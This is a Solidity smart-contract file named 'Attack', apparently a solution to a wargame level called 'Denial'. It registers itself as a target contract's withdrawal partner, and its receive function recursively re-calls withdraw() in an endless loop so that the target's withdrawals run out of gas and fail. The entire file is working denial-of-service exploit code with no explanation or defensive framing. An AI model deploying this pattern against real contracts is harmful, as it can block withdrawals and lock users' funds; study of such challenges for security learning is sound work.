// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address) external;
    function withdraw() external; 
}

contract Attack {
    IDenial denial;

    constructor(address _denial) {
        denial = IDenial(_denial);
        denial.setWithdrawPartner(address(this)); 
    }

    receive() external payable {
        while (true) {
            attackWithdraw();
        }
    }

    function attackWithdraw() public {
        denial.withdraw(); 
    }
}
